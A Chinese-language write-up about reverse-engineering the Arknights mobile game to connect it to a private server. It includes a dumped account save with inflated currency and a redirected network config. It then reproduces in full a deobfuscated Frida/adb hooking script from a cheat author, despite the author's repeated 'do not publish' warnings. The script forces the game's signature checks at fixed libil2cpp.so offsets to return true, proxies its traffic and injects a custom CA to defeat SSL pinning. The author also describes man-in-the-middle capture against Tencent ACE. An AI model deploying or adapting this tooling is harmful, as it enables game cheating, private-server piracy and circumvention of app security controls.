har_120_hibisc#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_heal_up[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;1&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_002_amiya&quot;,&quot;skin&quot;:&quot;char_002_amiya#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skcom_magic_rage[3]&quot;,&quot;unlock&quot;:1,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_amiya_2&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_amiya_3&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0}],&quot;instId&quot;:1,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:0,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;2&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_502_nblade&quot;,&quot;skin&quot;:&quot;char_502_nblade#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:2,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;3&quot;:{&quot;favorPoint&quot;:0,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_500_noirc&quot;,&quot;skin&quot;:&quot;char_500_noirc#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:3,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;4&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_503_rang&quot;,&quot;skin&quot;:&quot;char_503_rang#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:4,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;5&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_110_deepcl&quot;,&quot;skin&quot;:&quot;char_110_deepcl#1&quot;,&quot;currentEquip&quot;:&quot;uniequip_001_deepcl&quot;,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_deepcl_1&quot;,&quot;unlock&quot;:1,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_deepcl_2&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0}],&quot;instId&quot;:5,&quot;equip&quot;:{&quot;uniequip_001_deepcl&quot;:{&quot;hide&quot;:0,&quot;level&quot;:1,&quot;locked&quot;:0},&quot;uniequip_002_deepcl&quot;:{&quot;hide&quot;:0,&quot;level&quot;:1,&quot;locked&quot;:0}},&quot;gainTime&quot;:1674569468,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:0,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;6&quot;:{&quot;instId&quot;:6,&quot;charId&quot;:&quot;char_212_ansel&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_212_ansel#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_range_extend&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;7&quot;:{&quot;instId&quot;:7,&quot;charId&quot;:&quot;char_209_ardign&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_209_ardign#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_heal_self[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;8&quot;:{&quot;instId&quot;:8,&quot;charId&quot;:&quot;char_199_yak&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_199_yak#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_yak_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_yak_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;9&quot;:{&quot;instId&quot;:9,&quot;charId&quot;:&quot;char_281_popka&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_281_popka#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_atk_up[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;10&quot;:{&quot;instId&quot;:10,&quot;charId&quot;:&quot;char_150_snakek&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_150_snakek#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_def_up[2]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_snakek_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null}}},&quot;consumable&quot;:{},&quot;status&quot;:{&quot;monthlySubscriptionStartTime&quot;:0,&quot;monthlySubscriptionEndTime&quot;:0,&quot;instantFinishTicket&quot;:0,&quot;secretarySkinId&quot;:&quot;char_002_amiya#1&quot;,&quot;flags&quot;:{&quot;obt/guide/l2-8/0_fstar_level&quot;:1,&quot;obt/main/level_main_00-01_beg&quot;:1,&quot;obt/guide/bd/meeting_intro&quot;:1,&quot;obt/guide/shop/2_social&quot;:1,&quot;obt/guide/l1-2/0_upgrade_char_again&quot;:1,&quot;obt/guide/l0-1/1_training_level&quot;:1,&quot;obt/guide/l0-0/1_recruit_adv&quot;:1,&quot;obt/guide/bd/trade_lv3&quot;:1,&quot;obt/guide/bd/drone_accel&quot;:1,&quot;obt/guide/bd/dorm_intro&quot;:1,&quot;obt/guide/l0-11/1a_slot_clean&quot;:1,&quot;firstTradingRoom&quot;:1,&quot;obt/guide/bd/hr_intro&quot;:1,&quot;obt/guide/l0-11/1b_slot_clean&quot;:1,&quot;obt/guide/l1-5/0_campaign_stage&quot;:1,&quot;obt/guide/l0-11/3c_station_trade&quot;:1,&quot;obt/guide/shop/0_main_and_extraqc&quot;:1,&quot;obt/guide/bd/drone_exchange&quot;:1,&quot;init&quot;:1,&quot;obt/guide/l0-0/0_home_ui&quot;:1,&quot;obt/guide/l0-11/1c_slot_clean&quot;:1,&quot;obt/guide/l0-11/3a_station_manu&quot;:1,&quot;obt/guide/l2-3/0_weekly_evolve&quot;:1,&quot;obt/guide/l0-11/2a_build_elect&quot;:1,&quot;activities/act13side/guide/guide_act13side_mission_2&quot;:1,&quot;activities/act13side/guide/guide_act13side_mission_1&quot;:1,&quot;obt/guide/l0-11/2b_build_manu&quot;:1,&quot;obt/guide/l0-11/0_building_init&quot;:1,&quot;obt/guide/l0-11/3d_op_trade&quot;:1,&quot;obt/guide/bd/workshop_op&quot;:1,&quot;obt/guide/l0-1/0_mission_main&quot;:1,&quot;obt/guide/shop/1_furni&quot;:1,&quot;obt/guide/l0-11/1d_slot_clean&quot;:1,&quot;obt/main/level_main_00-01_end&quot;:1,&quot;obt/guide/l0-0/3_battle_ui&quot;:1,&quot;obt/guide/l0-11/2c_build_trade&quot;:1,&quot;obt/guide/l0-11/3b_op_manu&quot;:1,&quot;obt/guide/bd/control_intro&quot;:1,&quot;obt/guide/misc/assist_char&quot;:1,&quot;obt/guide/l0-0/2_make_squad&quot;:1},&quot;registerTs&quot;:1674569257,&quot;serverName&quot;:&quot;泰拉&quot;,&quot;gold&quot;:10072,&quot;uid&quot;:10000069,&quot;avatarId&quot;:&quot;0&quot;,&quot;secretary&quot;:&quot;char_002_amiya&quot;,&quot;tenGachaTicket&quot;:0,&quot;mainStageProgress&quot;:&quot;tr_01&quot;,&quot;lggShard&quot;:0,&quot;iosDiamond&quot;:259084234,&quot;practiceTicket&quot;:30,&quot;hggShard&quot;:11,&quot;apLimitUpFlag&quot;:0,&quot;exp&quot;:72,&quot;maxAp&quot;:84,&quot;friendNumLimit&quot;:15,&quot;resume&quot;:&quot;这个人很懒，目前还没有签名~&quot;,&quot;nickNumber&quot;:&quot;0001&quot;,&quot;lastRefreshTs&quot;:1644919200,&quot;lastOnlineTs&quot;:1674569721,&quot;level&quot;:1,&quot;nickName&quot;:&quot;1&quot;,&quot;lastApAddTime&quot;:1674569257,&quot;socialPoint&quot;:0,&quot;tipMonthlyCardExpireTs&quot;:0,&quot;avatar&quot;:{},&quot;gachaCount&quot;:11,&quot;ap&quot;:78,&quot;recruitLicense&quot;:5,&quot;buyApRemainTimes&quot;:10,&quot;diamondShard&quot;:609479736,&quot;androidDiamond&quot;:259084234,&quot;progress&quot;:900,&quot;gachaTicket&quot;:0},&quot;inventory&quot;:{&quot;p_char_236_rope&quot;:0,&quot;p_char_110_deepcl&quot;:0,&quot;act13side_prestige_commerce&quot;:50,&quot;p_char_133_mm&quot;:0,&quot;2001&quot;:33,&quot;p_char_281_popka&quot;:0,&quot;p_char_120_hibisc&quot;:0,&quot;30061&quot;:1,&quot;p_char_278_orchid&quot;:0,&quot;p_char_219_meteo&quot;:0,&quot;act13side_prestige_kazimierz&quot;:50,&quot;30031&quot;:1,&quot;3301&quot;:10,&quot;2002&quot;:15,&quot;p_char_150_snakek&quot;:0,&quot;p_char_209_ardign&quot;:0,&quot;p_char_212_ansel&quot;:0,&quot;p_char_199_yak&quot;:0,&quot;act13side_prestige_armorless&quot;:50},&quot;gacha&quot;:{&quot;normal&quot;:{&quot;NORM_25_0_2&quot;:{&quot;cnt&quot;:10,&quot;maxCnt&quot;:10,&quot;rarity&quot;:4,&quot;avail&quot;:false}},&quot;limit&quot;:{},&quot;newbee&quot;:{&quot;openFlag&quot;:1,&quot;cnt&quot;:20}}}}} 从这个架构来看，该游戏完全可以做成一个单机游戏，其绝大部分都是客户端计算，最后只是把一些氪金&amp;关卡等信息传到服务器上，而且其扩展性十分优秀，每次需要添加新角色时候，只需要客户端下载对应id的图像&amp;语音资源就可以直接继续运行，而服务端只需要添加一个新角色的json数据。 顺带一提，在对官服抓包分析的时候，我意外发现，官方的网络配置文件 12ak-conf.hypergryph.comak.hypergryph.com 这俩域名指向了同一个服务器，使用nginx进行反向代理，嗯哼？ apk分析起初我以为这个只需要手机上安装证书，然后小黄鸟抓包就可以简单分析了，直到我咋尝试都无法成功地抓到包，我这才意识到这之中十分不简单。因为当时我对SSL pinning并不了解，就直接从apk下手了。我搞到了同版本未被修改过的apk，然后在这之中发现了一些猫腻。 我并不会apk逆向，所以就简单粗暴的解压缩apk然后使用crc来找不同 可以看到classes.dex被修改了，而且在lib/arm64-v8a/目录下多了个libhook.so 我不太会逆向，所以说这里我也不清楚到底干了什么，不过我却找到了个更有趣的东西: 在res/xml/network_security_config.xml hook过的安装包里面的这个文件多了些内容 SSL pinning通过一通搜索，找到了一个关键词:SSL pinning 因为我并不会逆向，只能通过相关bypass原理反过来猜测此hook过的安装包实现方法，可能会有些谬误，还请包涵 首先，我们回过头来看一下配置文件: 1{&quot;sign&quot;:&quot;liOYRfqui44FAHTZ3SoXtHJgl4Vj8vu90aumePes3Kh1A1Z4QVLCXtlG5h0EzfXsTKmdaBJjBaDkAaoR/BUt1JA+SdLIEzyb6BNjbgL5whdH8EQABSo/M5fYFn8QRjSbtQNl5tUK0cYJgCT3ODVnEmHKFqydrkjCPgVNyXU4Eyg=&quot;,&quot;content&quot;:&quot;{\\&quot;configVer\\&quot;:\\&quot;5\\&quot;,\\&quot;funcVer\\&quot;:\\&quot;V025\\&quot;,\\&quot;configs\\&quot;:{\\&quot;V025\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;as\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;u8\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}},\\&quot;V026\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;https://ak-gs-gf.hypergryph.com\\&quot;,\\&quot;as\\&quot;:\\&quot;https://as.hypergryph.com\\&quot;,\\&quot;u8\\&quot;:\\&quot;https://as.hypergryph.com/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;https://ak.hycdn.cn/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}}}}&quot;} 这里有个sign十分的显眼 这是一个当时的使用frida对官方安装包hook的教程顺带一提，此游戏使用的也是unity引擎，lipcpp，能dump，但是我不会相关操作，吐了….在测试的时候，我还注意到，装载游戏核心逻辑的lib2cpp.so并没有太多的加密，有的只是一些花指令以及反ida的一些代码，到是unity游戏都必须配套的一个gm文件加密了，这和原神不太一样，原神是把lib2cpp.so进行一些偏移和异或加密 这里有一个函数，VerifySignMD5RSA，这就涉及到一些密码学原理了 public static Boolean VerifySignMD5RSA(String content, String sign, String publicKey) { } 签名验证过程好像是验证content的hash，如果content里改变了一个字符，这个验证就不通过了sign在验证代码中，是通过base64加密的，然后传到另一个参数是byte的VerifySignMD5RSA中进行验证publickey，顾名思义就是公钥了，用来解密sign的，在服务端应该是通过私钥进行加密的 注:公钥是直接写在客户端里面的 所以说，只要能hook到这个函数，让它返回True就可以过掉这里的验证，从而欺骗客户端，让它连接到我自己的服务器上了 然而，这只是第一步。 还有一个更头疼的问题，便是抓包的问题，现在各大厂家为了防止中间人攻击，都相继使用了证书锁定（SSL pinning）技术，也叫HTTP公钥固定,采用公钥固定时，网站会提供已授权公钥的哈希列表，指示客户端在后续通讯中只接受列表上的公钥。 官方文档:网络安全配置 然后….懂的都懂了吧 就是上文我发现的那个文件，越来越有意思了，嗯哼？ 不过，我感觉官方其实并没有能力自行解决这些问题，之后版本更新，ACE出现了。 当然，这个ACE不是那个ACE大哥，是这个 腾讯反作弊 version 1.9.62[仇白版本]这是该手游现在的版本(2023/2) 对比去年，此版本加了个ACE，关于它的抓包真的折磨死我了，感慨一句，CTF和Realworld差别还是挺大的这次，没有前人遗留下来的脚本，我有的只有一个外挂作者发出来的混淆成九转大肠的pyc文件(这个混淆就是我上周周报发的pyobfuscate) 头疼的是，他的私服用的是https加密emmmm 痛苦的证书安装在研究1.9.62抓包方法，我首先想到便是安装证书，在装坏了好几个安卓模拟器之后，我把目光放在了我的平板上面…. 论现在的厂商为了&quot;安全&quot;都做了什么努力 问题: 证书安装现在，安卓11永远不信任用户证书，你装进去基本没用，应用程序都基本不会使用用户安装证书，只会用系统根证书。 然后….更更更恶心的是: 根证书在/system/etc/security/cacerts这个目录下面 诶嘿，只读环境 重新挂载 /system/bin/sh: remout: inaccessible or not found 尝试Overlayfs挂到/system/etc/security/cacerts，没有用处 经过艰难险阻，在互联网的一角，我看到了第三方rec修改，然后我的平板是小米平板5，没有第三方Recovery适配 最后，酷安帮到了我，在爱玩机工具箱中 有个这玩意，能直接做个模块出来淦进系统，终于能抓到包了….吗？？ ACE大哥出来了，哈希锁定，谁都别想抓包 脚本的反混淆做到那一步我都要头疼死了，然后对外挂作者混淆的代码一通输出…(关于反混淆的过程，我写在了上周的周报了，就是那个pyobfuscate的反混淆) 等我把那个脚本反混淆了之后，我完全可以用wireshark本地环回抓包就行了，因为脚本里都是adb和frida的操作，而这俩都是直接明文传 此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦此脚本请勿公开，仅供内部技术交流使用，以免造成不必要的麻烦 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192# -*- coding: utf-8 -*-import argparseimport sysimport timefrom base64 import b64decodeimport fridafrom adbutils import adbfrom loguru import loggerARG = b64decode(&quot;私服URL&quot;).decode()def on_message(message, data): print(&quot;[%s] =&gt; %s&quot; % (message, data))def main(use_mumu=False, attach=False): try: adb_device = adb.device_list()[0] except IndexError: default_ports = [&quot;5555&quot;, &quot;7555&quot;, &quot;62001&quot;, &quot;62025&quot;] for port in default_ports: logger.info(f&quot;Try port {port}...&quot;) adb.connect(f&quot;127.0.0.1:{port}&quot;) time.sleep(0.5) if len(adb.device_list()) &gt; 0: logger.info(&quot;Connected to device&quot;) adb_device = adb.device_list()[0] if adb_device.shell(&quot;command -v su&quot;) == &quot;&quot;: logger.error(&quot;Please give Emulator Root permission, Exiting...&quot;) sys.exit(1) if adb_device.shell(&quot;pidof frida-server&quot;) == &quot;&quot;: logger.info(&quot;Loading...&quot;) adb_device.shell(&quot;su -c \\&quot;/data/local/tmp/frida-server -D\\&quot;&quot;) time.sleep(1) if not attach: device = frida.get_usb_device(timeout=1) pid = device.spawn(b64decode('Y29tLmh5cGVyZ3J5cGguYXJrbmlnaHRz').decode()) device.resume(pid) session = device.attach(pid) else: device = frida.get_usb_device(timeout=1) session = device.attach('Arknights') script = session.create_script(&quot;&quot;&quot;function _0x13812a(_0x363014, _0x1394d6) {{ Java.perform(function (){{ var _0x1a0c09 = Java.use(&quot;java.net.URL&quot;); var _0x1bcad5 = Java.use('java.net.Proxy$Type'); var _0x579e72 = Java.use(&quot;java.net.InetSocketAddress&quot;); var _0x599d05 = Java.use('java.net.Proxy'); _0x1a0c09.$init.overload('java.lang.String').implementation = function (var0) {{ return this.$init(var0); }}; _0x1a0c09.openConnection.overload().implementation = function () {{ var _0x47ed4a; try{{ _0x47ed4a = _0x599d05.$new(_0x1bcad5.valueOf('HTTP'), _0x579e72.$new(_0x363014, _0x1394d6)); }} catch(e){{ console.log(e); }} return this.openConnection(_0x47ed4a); }}; }});}}function _0x215797(_0x5df837){{ Java.perform(function (){{ var _0x4a7b21 = Java.use(&quot;java.security.cert.CertificateFactory&quot;); var _0x7df8e3 = Java.use(&quot;java.io.FileInputStream&quot;); var _0x35c5e4 = Java.use(&quot;java.io.BufferedInputStream&quot;); var _0x4b6699 = Java.use(&quot;java.security.KeyStore&quot;); var _0x5c2a78 = Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;); var _0x1689b3 = Java.use(&quot;javax.net.ssl.SSLContext&quot;); var _0x251a51 = _0x4a7b21.getInstance(&quot;X.509&quot;); try {{ var _0x3cc1c8 = _0x7df8e3.$new(_0x5df837); }} catch(_0x565757) {{ console.log(&quot;[o] &quot; + _0x565757); }} var _0x3a7e1c = _0x35c5e4.$new(_0x3cc1c8); var _0x5417ee = _0x251a51.generateCertificate(_0x3a7e1c); _0x3a7e1c.close(); var _0x2ee0dd = _0x4b6699.getDefaultType(); var _0x10c4b0 = _0x4b6699.getInstance(_0x2ee0dd); _0x10c4b0.load(null, null); _0x10c4b0.setCertificateEntry(&quot;ca&quot;, _0x5417ee); var _0x32527e = _0x5c2a78.getDefaultAlgorithm(); var _0x257ee8 = _0x5c2a78.getInstance(_0x32527e); _0x257ee8.init(_0x10c4b0); _0x1689b3.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).implementation = function(_0x26f6a3,b,_0x43a1f8) {{ _0x1689b3.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).call(this, _0x26f6a3, _0x257ee8.getTrustManagers(), _0x43a1f8); }} }});}}function _0xf3fffe(_0x2ff147){{ var _0x26f6e2 = Process.getModuleByName(&quot;libil2cpp.so&quot;); var _0x38210d = _0x26f6e2.base.add(_0x2ff147); return new NativePointer(_0x38210d.toString());}}function _0x25d96d(_0x2deb5e) {{ var _0x2366a9 = _0xf3fffe(_0x2deb5e); Interceptor.attach(_0x2366a9,{{ onEnter: function(args){{}}, onLeave: function(retval){{ retval.replace(0x1); }} }});}}function _0x2e4db4(_0x55aa43) {{ var _0x357967 = _0xf3fffe(_0x55aa43); Interceptor.attach(_0x357967,{{ onEnter: function(args){{}}, onLeave: function(_0x41e085){{ _0x41e085.replace(0x0); }} }});}}function _0x2679e6(_0x4b81fb) {{ var _0x4f51f0 = _0xf3fffe(_0x4b81fb); Interceptor.attach(_0x4f51f0,{{ onEnter: function(args){{ }}, onLeave: function(retval){{ }} }});}}function _0x51a5b1(){{ //main函数 var _0x4ba0b9 = &quot;{ARG}&quot;; var _0x51e879 = 8080; var _0x2eeed0 = &quot;/data/local/tmp/cert.cer&quot;; var _0xdc6e3d = function (e) {{ //代理 var _0x360bad = setInterval(function () {{ //过hook var _0x405ec9 = Module.findBaseAddress(&quot;libil2cpp.so&quot;); if (_0x405ec9) {{ clearInterval(_0x360bad); e(+_0x405ec9); return; }} }}, 0); }} _0xdc6e3d(()=&gt;{{ [0xfe978f, 0x362b87e].forEach(_0x25d96d); //偏移，x86 [0xfde384].forEach(_0x2e4db4); }}); _0x13812a(_0x4ba0b9, _0x51e879); _0x215797(_0x2eeed0);}}_0x51a5b1();&quot;&quot;&quot;.format(ARG=ARG)) script.on('message', on_message) script.load() print(&quot; _____ _ _ _ _ &quot;) print(&quot; | __ \\| | (_) | | | | &quot;) print(&quot; | |__) | |__ _ _ __ ___ | | __ _| |__ &quot;) print(&quot; | _ /| '_ \\| | '_ \\ / _ \\ | | / _` | '_ \\ &quot;) print(&quot; | | \\ \\| | | | | | | | __/ | |___| (_| | |_) |&quot;) print(&quot; |_| \\_\\_| |_|_|_| |_|\\___| |______\\__,_|_.__/ &quot;) print(&quot; &quot;) print(&quot;t.me/RhineServer\\n&quot;) print(&quot;Success!&quot;) print(&quot;Please do NOT close the window.\\n&quot;) sys.stdin.read() session.detach()if __name__ == '__main__': args = argparse.ArgumentParser(description='RhineLab Hooking Script') args.add_argument('-a', '--attach', action='store_true', help='attach') args.add_argument('-m', '--mumu', action='store_true', help='mumu') args = args.parse_args() try: main(args.mumu, args.attach) except KeyboardInterrupt: if len(adb.device_list()) &gt; 0: logger.info(&quot;Exiting...&quot;) adb_device = adb.device_list()[0] adb_device.shell(&quot;su -c \\&quot;kill `pidof frida-server`\\&quot;&quot;) Js部分的混淆只是最简单的变量名替换，网上搜索frida SSL unpinning能找到相似的代码，此处js代码只是多了一个过hook的操作 可以抓包了….吗？？成功拿到hook的脚本之后，撸起袖子开始干，准备抓包了，然后…. 加载时候的包都有，但是…等我登录进去，抽卡，签到等等操作，我始终没有看到任意一个包出现在我的抓包软件上，为此我还换了好几种抓包软件，burpsuite,mitm,… APP各种抓包教程 Hook | SSL Pinning |Frida 都没抓到emmm，打开wireshark看到了一段SSL流量，但就是抓不到包(这nm什么活啊) 然后，我用mitm 整了一个手动中间人攻击… 大致架构是这样子的: 还记得我之前说，加载网络配置那个桥段吗？，我把上面的所有网址全都换成http://127.0.0.1,然后mitm就能抓到所有的http请求了，再然后我拿着这些http请求，手动搓一个request 别问我为啥不用mitm的pythonapi，问就是还在学 “抓”到了 感想:大年三十晚上看到了这款游戏的私服，然后我就来了兴趣，想研究一下，没想到一研究就研究了十几天，因为不会逆向，踩了不少坑，不过也因此学到了很多东西，包括安卓的一些机制，也自己稍微学了一些frida hook的技巧，也认识了一些u3d引擎制作的游戏文件的结构，见识到了现在主流的一些防御手段，包括JA3 拦截（如果有师傅对JA3拦截感兴趣的话，我会写篇文章跟师傅们一起讨论的qwq），ssl pinning等 